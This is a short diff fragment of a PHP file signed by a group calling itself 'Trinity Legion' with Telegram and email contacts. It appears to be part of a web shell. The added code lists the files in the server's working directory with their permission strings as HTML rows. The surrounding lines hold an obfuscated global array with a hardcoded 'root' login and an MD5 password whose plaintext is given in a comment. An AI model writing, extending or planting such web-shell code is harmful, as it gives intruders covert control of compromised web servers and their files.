@@ -4,6 +4,35 @@
 	Telegram: 	https://t.me/trinitylegionbot
 	email:		trinitylegion@yahoo.com
 */
+
+function formatPerms($perms) {
+    $info = '';
+    $info .= ($perms & 0x4000) ? 'd' : '-';
+    $info .= ($perms & 0x0100) ? 'r' : '-';
+    $info .= ($perms & 0x0080) ? 'w' : '-';
+    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
+    $info .= ($perms & 0x0020) ? 'r' : '-';
+    $info .= ($perms & 0x0010) ? 'w' : '-';
+    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
+    $info .= ($perms & 0x0004) ? 'r' : '-';
+    $info .= ($perms & 0x0002) ? 'w' : '-';
+    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
+    return $info;
+}
+
+$path = '.';
+$scan = scandir($path);
+
+foreach ($scan as $file) {
+    if ($file == '.' || $file == '..') continue;
+    $fullpath = $path . DIRECTORY_SEPARATOR . $file;
+
+    echo "<tr>";
+    echo "<td>$file</td>";
+    echo "<td>" . formatPerms(fileperms($fullpath)) . "</td>";
+    echo "</tr>";
+}
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
     'password' => 'a1a1b4a7d61651c75d505f8cc906294b',//md5(TrinityLegion)
